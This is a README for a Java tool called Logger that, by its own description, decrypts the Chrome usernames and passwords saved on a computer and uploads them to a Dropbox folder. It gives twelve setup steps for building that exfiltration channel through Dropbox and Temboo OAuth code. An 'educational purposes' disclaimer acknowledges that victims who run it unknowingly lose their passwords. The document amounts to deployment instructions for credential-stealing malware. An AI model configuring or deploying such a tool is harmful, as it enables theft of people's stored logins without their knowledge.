# Logger
A logger that decrypts chrome usernames and passwords saved on the computer and uploads them to DropBox.

# Instructions

- [ ] **Step 1:** Create a DropBox account: https://www.dropbox.com/register

- [ ] **Step 2:** Create a new app: https://www.dropbox.com/developers/apps/create

- [ ] **Step 3:** Click on DropBox API.

- [ ] **Step 4:** Click App Folder.

- [ ] **Step 5:** Name your app. This is where all the decrypted files will be uploaded.

- [ ] **Step 6:** Now, in your [dashboard](https://www.dropbox.com/home), you should see a new \"Apps\" folder.

- [ ] **Step 7:** Now, there should be a folder with the name of your app.

- [ ] **Step 8:** Inside, this folder, there should be a RootFolder.

- [ ] **Step 9:** Go to [temboo](https://temboo.com/) and create an account.

- [ ] **Step 10:** Watch this [short video](https://www.temboo.com/videos#oauthchoreos) to configure temboo.

- [ ] **Step 11:** Configure the test runner in the video to generate java code by clicking Java from the dropdown near the top.

- [ ] **Step 12:** Once this code has been generated, replace lines 140-158 in Logger.java with this auto-generated code.

# Disclaimer
This software is for educational purposes only. I am not liable for any misuse of the software nor do I encourage black hat hacking. Please also be aware that even if the victim runs it without acknowledging it, the software will automatically upload all the saved usernames and passwords to DropBox. Be sure to comment out this code or put in the authentication information of a trusted Temboo / DropBox account. To create a Temboo account that will generate this DropBox code for you, go to https://temboo.com/library/Library/Dropbox/OAuth/ and follow the directions listed on site for Java.
